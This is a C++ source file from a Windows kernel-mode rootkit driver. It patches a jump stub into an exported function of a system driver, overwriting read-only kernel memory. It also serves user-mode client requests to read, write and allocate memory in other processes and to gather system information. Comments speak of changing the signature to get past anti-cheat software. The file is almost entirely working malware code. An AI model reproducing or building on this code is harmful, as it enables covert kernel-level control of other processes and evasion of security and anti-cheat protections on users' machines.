#include "hooking.h"


// Simple hook to a function (driver::function) -> mov ax, hookingfunc ; jmp ax -
bool roothook::KernelFunctionHook(void* func_address, const char* module_name, const char* hookto_name) {
	// DbgPrintEx(0, 0, "KMDFdriver CALLING A KERNEL FUNCTION\n");
	
	if (!func_address) {
		DbgPrintEx(0, 0, "KMDFdriver CALLING A KERNEL FUNCTION IN INVALID ADDRESS :(\n");
		return FALSE;  // MY function address is not valid
	}

	// Get pointer to the hookto function in the driver it exists in (i am hooking to NtQueryCompositionSurfaceStatistics() from the driver dxgkrnl.sys) -
	// Note: can pick any function from any system driver but make sure that it does not have security_cookie in it (disassmble with windbg to check- .reload drivername and set breakpoints)
	PVOID* hookto_func = reinterpret_cast<PVOID*>(SystemModuleExportMEM(module_name, hookto_name));
	if (!hookto_func) {
		DbgPrintEx(0, 0, "KMDFdriver FAILED GETTING THE HOOKTOFUNC ADDRESS :(\n");
		return FALSE;  // HOOKTO function address is not valid
	}
	
	// Byte data that exists in the beginning of the hookto function (will be replaced later - actual hooking data) -
	BYTE og_data[] = { 0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xE0 };

	// Create shellcode that will perform the jump when hookto_func will be called -
	//BYTE store_rax[] = { 0x48, 0xB8 };  // Translates into "mov rax" (FOR THE FUTURE: CHANGE SIGNATURE/INTERPERTATION TO PASS SOME ANTICHEATS)
	//BYTE call_myfunc[] = { 0xFF, 0xE0 };  // Translates into "jmp rax" (FOR THE FUTURE: CHANGE SIGNATURE/INTERPERTATION TO PASS SOME ANTICHEATS)
	BYTE StoreSize = 2;  // first 2 bytes
	BYTE CallSize = 2;  // last 2 bytes
	UNREFERENCED_PARAMETER(CallSize);

	// Write hooking instruction into a point in memory (shell code) -
	RtlSecureZeroMemory(&og_data, sizeof(og_data));  // Size is 12 bytes, secure memory for og_data
	ULONG_PTR actual_myfuncaddr = reinterpret_cast<ULONG_PTR>(func_address);  // Reinterpert my function's address to write into memory
	memcpy((PVOID)((ULONG_PTR)og_data + StoreSize), &actual_myfuncaddr, sizeof(actual_myfuncaddr));  // Size is 8 bytes (64 bits address), write myfunc address into memory (to complet "mov rax, myfunc_addr)
	
	// Writing the shell code into the hookto function -
	WriteToReadOnlyMemoryMEM(hookto_func, &og_data, sizeof(og_data));
	return TRUE;
}


/*
Function to perform SSDT hooking -
*/


NTSTATUS roothook::SystemServiceDTHook() {
	return STATUS_SUCCESS;
}


/*
Function to perform SSDT hooking -
*/


NTSTATUS roothook::InterruptDTHook() {
	return STATUS_SUCCESS;
}


// Handle all the requests from ActClient, actual hooking function for the method used for UM-KM coms -
NTSTATUS roothook::HookHandler(PVOID hookedf_params) {
	DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST LOG=-=-=-=-=-\n\n");
	DbgPrintEx(0, 0, "KMDFdriver HOOOOOKHANDLER (highest UM address = %p)\n", (PVOID)general::GetHighestUserModeAddrADD());

	ROOTKIT_MEMORY* RootkInstructions = (ROOTKIT_MEMORY*)hookedf_params;
	NTSTATUS Return = STATUS_SUCCESS;
	RootkInstructions->IsFlexible = FALSE;  // verify that operation was made and the transforming of data KM-UM


	switch (RootkInstructions->Operation) {
	case RKOP_MDLBASE:
		// Request process module address -

		DbgPrintEx(0, 0, "Request Type: get base address of module\n");
		Return = GetModuleBaseRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_WRITE:
		// Copy into memory -

		DbgPrintEx(0, 0, "Request Type: write data into memory\n");
		Return = WriteToMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_READ:
		// Read from memory -

		DbgPrintEx(0, 0, "Request Type: read data from memory\n");
		Return = ReadFromMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_DSPSTR:
		// Display message in windbg -

		DbgPrintEx(0, 0, "Request Type: print message to kernel debugger\n");
		Return = PrintDbgMsgRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_SYSINFO:
		// get system information/s by request -

		DbgPrintEx(0, 0, "Request Type: get information about target system\n");
		Return = RetrieveSystemInformationRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;


	case RKOP_PRCMALLOC:
		// allocate specified memory in specified process -

		DbgPrintEx(0, 0, "Request Type: allocate memory in the virtual address space of a process\n");
		Return = AllocSpecificMemoryRK(RootkInstructions);
		DbgPrintEx(0, 0, "\n-=-=-=-=-=REQUEST ENDED=-=-=-=-=-\n\n");
		return Return;
	}
	return STATUS_SUCCESS;
}